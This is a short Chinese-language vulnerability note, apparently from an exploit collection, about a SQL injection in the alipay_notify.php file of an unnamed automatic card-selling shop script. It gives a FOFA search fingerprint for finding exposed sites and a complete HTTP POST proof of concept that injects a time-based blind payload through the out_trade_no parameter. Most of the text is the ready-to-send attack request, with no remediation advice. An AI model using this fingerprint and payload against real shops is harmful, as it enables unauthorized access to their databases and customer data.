# 某自动发卡网alipay_notify.php存在SQL注入漏洞

**位于** **/shop/alipay_notify.php 中** **post直接传入out_trade_no，并且直接拼接进语句导致前台SQL注入**

## fofa

```javascript
"template/t1/assets/js/odometer.min.js"
```

![image-20240716201017098](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407162010214.png)

## poc

```javascript
POST /shop/alipay_notify.php HTTP/2
Host: 127.0.0.1
Cookie: PHPSESSID=audck4dekct1clpgrqfcunre66
Content-Length: 14
Cache-Control: max-age=0
Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: http://127.0.0.1/shop/alipay_notify.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Sec-Fetch-User: ?1
Priority: u=0, i

out_trade_no=' AND (SELECT 4286 FROM (SELECT(SLEEP(5)))ztQX)-- rLAn
```

![image-20240716201023750](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407162010821.png)



## 漏洞来源

- https://mp.weixin.qq.com/s/ovB7d4ePnGmCEg-F1k3ZGg